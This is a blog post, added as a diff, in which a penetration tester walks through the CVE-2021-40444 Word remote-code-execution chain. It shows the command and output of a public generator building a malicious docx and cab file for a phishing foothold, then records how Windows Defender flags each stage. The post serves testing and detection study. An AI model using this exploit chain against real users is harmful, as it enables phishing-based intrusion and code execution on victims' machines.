@@ -1,0 +1,85 @@
+---
+layout: post
+title:  "CVE 2021 40444"
+date:   2021-09-26
+categories: progress work
+---
+Finally was able to squeeze out some time to look at CVE 2021 40444 and as expected, the exploit no longer works on a fully updated Windows machine as it has already been heavily signatured.
+
+> * https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444
+
+It was worth taking a look as a document based attack could be really useful in an engagement, granting us initial foothold through email phishing attack. 
+
+Let's take a look at how this is being detected now.
+
+A repository available on github by lockedbyte basically has all the juice that we need to reproduce the exploit. Basically it has a 'template' .cab file, a 'template' .docx file, and the core .html exploit. The tools on the repository allow you to specify ur own payload (it patches the .cab file with your payload) and the .docx generated will be auto populated with your server endpoint as well. Pretty neat.
+
+> * https://github.com/lockedbyte/CVE-2021-40444
+
+How the flow works is basically:
+
+1. generate the exploit files with the .py script by specifying a .dll payload and your server endpoint
+2. it patches .cab file with your .dll payload, populates a .cab, .docx and a .html for the full exploit chain
+3. get your victim to open .docx and enable content
+4. external references inserted in the xml of the .docx fetches the .html file and executes it
+5. .html file fetches the .cab file and executes it
+6. RCE as defined in your .dll payload (.cab)
+
+```
+root@workstation-1906:/tmp/CVE-2021-40444# python3 exploit.py generate test/calc.dll http://172.16.191.3/
+[%] CVE-2021-40444 - MS Office Word RCE Exploit [%]
+[*] Option is generate a malicious payload...
+
+[ == Options == ]
+      [ DLL Payload: test/calc.dll
+      [ HTML Exploit URL: http://172.16.191.3/
+
+[*] Writing HTML Server URL...
+[*] Generating malicious docx file...
+  adding: [Content_Types].xml (deflated 75%)
+  adding: _rels/ (stored 0%)
+  adding: _rels/.rels (deflated 61%)
+  adding: docProps/ (stored 0%)
+  adding: docProps/app.xml (deflated 48%)
+  adding: docProps/core.xml (deflated 50%)
+  adding: word/ (stored 0%)
+  adding: word/webSettings.xml (deflated 57%)
+  adding: word/fontTable.xml (deflated 74%)
+  adding: word/settings.xml (deflated 63%)
+  adding: word/document.xml (deflated 85%)
+  adding: word/theme/ (stored 0%)
+  adding: word/theme/theme1.xml (deflated 79%)
+  adding: word/styles.xml (deflated 89%)
+  adding: word/_rels/ (stored 0%)
+  adding: word/_rels/document.xml.rels (deflated 75%)
+[*] Generating malicious CAB file...
+[*] Updating information on HTML exploit...
+[+] Malicious Word Document payload generated at: out/document.docx
+[+] Malicious CAB file generated at: srv/word.cab
+[i] You can execute now the server and then send document.docx to target
+root@workstation-1906:/tmp/CVE-2021-40444# 
+
+```
+
+Ohhhh shoot! The very first detection is of course the templated document.docx itself. It is being detected as a Trojan Downloader. Fair enough, since the external references in the xml of the .docx indicate that.
+
+<div style="text-align: center"><img src="/images/cve1.png" height="260" width="680"/></div>
+
+Let's create a whitelist for the file and observe what are the subsequent detections if any, for this exploit.
+
+The next detection can be observed as the following:
+
+<div style="text-align: center"><img src="/images/cve2.png" height="260" width="680"/></div>
+
+As explained in the flow, the next detection point as expected belongs to the .html file being downloaded when the .docx is executed. The cached copy of the .html file created in the users' AppData directory can be seen to trigger Defender.
+
+And finally, we can see that the .cab file was being flagged by Defender as well.
+
+<div style="text-align: center"><img src="/images/cve3.png" height="260" width="680"/></div>
+
+Interestingly enough there are other formats for exploitation. It appears that .cab archive is also not compulsory. Worth looking when time allows!
+
+> * https://dl.packetstormsecurity.net/2109-exploits/MS_Windows_CVE-2021-40444.pdf
+
+
+
